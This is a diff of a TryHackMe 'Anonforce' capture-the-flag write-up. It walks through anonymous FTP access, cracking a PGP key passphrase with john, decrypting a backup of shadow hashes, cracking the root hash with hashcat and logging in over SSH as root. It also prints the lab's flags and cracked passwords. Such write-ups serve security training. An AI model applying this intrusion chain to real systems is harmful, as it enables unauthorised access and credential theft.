@@ -1,20 +1,22 @@
 | ![Anonforce](/Assets/Images/anonforce.png) | <br><br>Name - Anonforce<br>Difficulty - Easy<br>Type - Linux |
 | :----------------------------------------- | :------------------------------------------------------------ |
-|                                            |                                                               |
 
 Link - "https://tryhackme.com/room/bsidesgtanonforce"
 
-
-# Anonforce Machine
-
-- **Nmap Scan Result -** 
 ```
-$ sudo nmap -sCV 10.10.164.179
+echo 'MACHINE_IP anonyforce.thm' | sudo tee -a /etc/hosts
+```
 
-Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-22 00:36 BST
-Nmap scan report for 10.10.164.179
-Host is up (0.021s latency).
-Not shown: 998 closed tcp ports (reset)
+# ⚝ Enumeration
+
+**Nmap Scan Result -** 
+
+```
+$ nmap -sCV -p- anonforce.thm
+
+Nmap scan report for anonforce.thm (10.80.129.180)
+Host is up (0.014s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
 
 PORT   STATE SERVICE VERSION
 
@@ -22,7 +24,7 @@ PORT   STATE SERVICE VERSION
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
 | drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
-| drwxr-xr-x   17 0        0            3700 May 21 16:33 dev
+| drwxr-xr-x   17 0        0            3700 May 20 04:37 dev
 | drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
 | drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
 | lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
@@ -34,69 +36,133 @@ PORT   STATE SERVICE VERSION
 | drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
 | drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
 | drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
-| dr-xr-xr-x   94 0        0               0 May 21 16:33 proc
+| dr-xr-xr-x   94 0        0               0 May 20 04:37 proc
 | drwx------    3 0        0            4096 Aug 11  2019 root
-| drwxr-xr-x   18 0        0             540 May 21 16:33 run
+| drwxr-xr-x   18 0        0             540 May 20 04:37 run
 | drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
 | drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
-| dr-xr-xr-x   13 0        0               0 May 21 16:33 sys
+| dr-xr-xr-x   13 0        0               0 May 20 04:37 sys
 |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to ::ffff:10.11.128.224
+|      Connected to ::ffff:192.168.232.30
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
-|      At session startup, client count was 1
+|      At session startup, client count was 3
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
 
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 8af9483e11a1aafcb78671d02af624e7 (RSA)
-|   256 735dde9a886e647ae187ec65ae1193e3 (ECDSA)
-|_  256 56f99f24f152fc16b77ba3e24f17b4ea (ED25519)
+|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
+|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
+|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
+
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-- **ftp ( Anonymous Login ) -** 
+From the above scan we got two open ports `21(ftp)` and `22(ssh)`. The main thing to notice here is that `Anonymous FTP login allowed`.
 
-`ftp Anonymous@10.10.164.179`
+# ⚝ Exploitation - Initial Access
+
+Let's login and get some more information. We don't need any password just press `Enter` for that.
+
+**ftp ( Anonymous Login ) -** 
 
 ```shell
+$ ftp Anonymous@anonforce.thm
 
-ftp> cd home
-250 Directory successfully changed.
+Connected to anonforce.thm.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
 ftp> ls
-229 Entering Extended Passive Mode (|||51009|)
+200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
-drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+drwxr-xr-x   17 0        0            3700 May 20 04:37 dev
+drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
+drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
+drwx------    2 0        0           16384 Aug 11  2019 lost+found
+drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
+drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
+drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
+dr-xr-xr-x   92 0        0               0 May 20 04:37 proc
+drwx------    3 0        0            4096 Aug 11  2019 root
+drwxr-xr-x   18 0        0             540 May 20 04:37 run
+drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
+dr-xr-xr-x   13 0        0               0 May 20 04:37 sys
+drwxrwxrwt    9 0        0            4096 May 20 04:37 tmp
+drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
+drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
 226 Directory send OK.
-ftp> cd melodias
-250 Directory successfully changed.
+ftp> 
+```
+
+We can find our user flag in `/home/melodias` directory.
+
+```
+ftp> pwd
+257 "/home/melodias" is the current directory
 ftp> ls
-229 Entering Extended Passive Mode (|||43574|)
+200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
 -rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
 226 Directory send OK.
-ftp> less user.txt
-606083fd33beb1284fc51f411a706af8
+ftp> cat user.txt
+?Invalid command
+ftp> 
+```
+
+Ahh, we can't simply run `cat` command here, it's not like a normal shell. Let's see what commands we can run by using the `help` command.
 
 ```
-We got our first flag.
+ftp> help
+Commands may be abbreviated.  Commands are:
 
-**Q1. user.txt**
-	606083fd33beb1284fc51f411a706af8
+!		dir		macdef		proxy		site
+$		disconnect	mdelete		sendport	size
+account		epsv4		mdir		put		status
+append		form		mget		pwd		struct
+ascii		get		mkdir		quit		system
+bell		glob		mls		quote		sunique
+binary		hash		mode		recv		tenex
+bye		help		modtime		reget		trace
+case		idle		mput		rstatus		type
+cd		image		newer		rhelp		user
+cdup		ipany		nmap		rename		umask
+chmod		ipv4		nlist		reset		verbose
+close		ipv6		ntrans		restart		?
+cr		lcd		open		rmdir
+delete		lpwd		passive		runique
+debug		ls		prompt		send
+ftp> 
 
+```
 
-- **Priv -** 
+We can use the `get` command to download the `user.txt` file locally and read. We got our first flag now let's try to grab the second flag.
 
-We got an interesting directory `notread`.
+# ⚝ Privilege Escalation
+
+If we check our previous file listing inside `/`, we can find a directory named `notread`. Let's check why ...
 
 ```
 ftp> cd notread
@@ -110,18 +176,21 @@ ftp> ls
 ftp> 
 ```
 
-Let's decrypt - 
-```shell
+Nice, We can find an encrypted file and also the key. PGP stands for 'Pretty Good Privacy'.
 
+Let's get these files and first target the key `private.asc`. I converted the private key file into john(JohnTheRipper) crackable format.
+
+```shell
 gpg2john private.asc > hash
 ```
 
+Next, used `john` to crack it using it's default dictionary.
+
 ```shell
-
-sudo /opt/john/run/john hash
+john hash
 ```
-`xbox360`
 
+`xbox360` is the cracked output. Now let's use this to read the content from `backup.pgp`.
 
 ```shell
 
@@ -159,26 +228,40 @@ melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
 sshd:*:18120:0:99999:7:::
 ftp:*:18120:0:99999:7:::
 ```
-We got some interesting data here.
+
+If you face any error, import the `private.asc` first and then decrypt command. For example - 
+
+```
+First:
+$ gpg --import private.asc
+
+Second:
+$ gpg --decrypt backup.pgp
+```
+
+Back to the challenge, We got some interesting data here. A username and it's password hash.
 `root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0`
 
-- hashcat -
+I saved the above data in a file called `crack_hash` and used `hashcat` to crack it.
 
-`hashcat -m 1800 crack_hash --show`
+`hashcat -m 1800 -a 0 crack_hash /usr/share/wordlists/rockyou.txt --username`
 
-`hikari`
+Notes:
+- I used `--username` flag to process the identifier properly.
+- We can get the info about the `hash-mode or -m` from "https://hashcat.net/wiki/doku.php?id=example_hashes". The above hash starts with `$6$` which matches `sha512crypt $6$, SHA512 (Unix)` and mode `1800`.
 
-`ssh root@10.10.168.174` with `hikari`.
+I got `hikari` as cracked password for `root` user. Let's login as `root` and grab our final flag.
+
+I got the root shell using `ssh root@anonforce.thm` command with `hikari` as password.
+
+We can find our root flag inside `/root`.
 
 ```shell
-
 root@ubuntu:~# pwd
 /root
 root@ubuntu:~# ls
 root.txt
-root@ubuntu:~# cat root.txt
-f706456440c7af4187810c31c6cebdce
-
 ```
+
 
 ! Happy Hacking !
